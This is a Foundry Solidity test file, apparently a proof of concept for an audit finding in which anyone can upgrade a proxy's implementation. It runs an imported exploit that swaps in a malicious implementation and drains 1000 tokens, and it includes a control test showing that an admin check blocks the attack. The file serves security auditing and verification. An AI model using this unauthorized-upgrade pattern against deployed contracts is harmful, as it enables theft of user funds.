// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    Asset,
    ERC1967FactoryFixed,
    VaultProxy,
    EvilLogic
} from "./37160-anyone-can-upgrade-an-implementation-zokyo-none-curra-markdo.sol";

contract Finding37160Test is Test {
    function test_exploit_anyone_upgrades_and_drains() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.drained(), 1000 ether, "1000 tokens drained");
        assertEq(e.token().balanceOf(address(e)), 1000 ether, "attacker balance");
        assertEq(e.token().balanceOf(address(e.proxy())), 0, "proxy empty");
        assertEq(e.proxy().implementation(), address(e.evil()), "implementation replaced");
    }

    function test_control_admin_check_blocks_upgrade() public {
        Asset token = new Asset();
        ERC1967FactoryFixed factory = new ERC1967FactoryFixed(address(0xBEEF));
        VaultProxy proxy = new VaultProxy(address(factory), token);
        EvilLogic evil = new EvilLogic();
        token.mint(address(proxy), 1000 ether);
        vm.expectRevert(bytes("admin"));
        factory.upgradeAndCall(address(proxy), address(evil), abi.encodeWithSelector(EvilLogic.drain.selector, address(this)));
        assertEq(token.balanceOf(address(proxy)), 1000 ether, "tokens stay");
        assertEq(token.balanceOf(address(this)), 0, "attacker got nothing");
    }
}
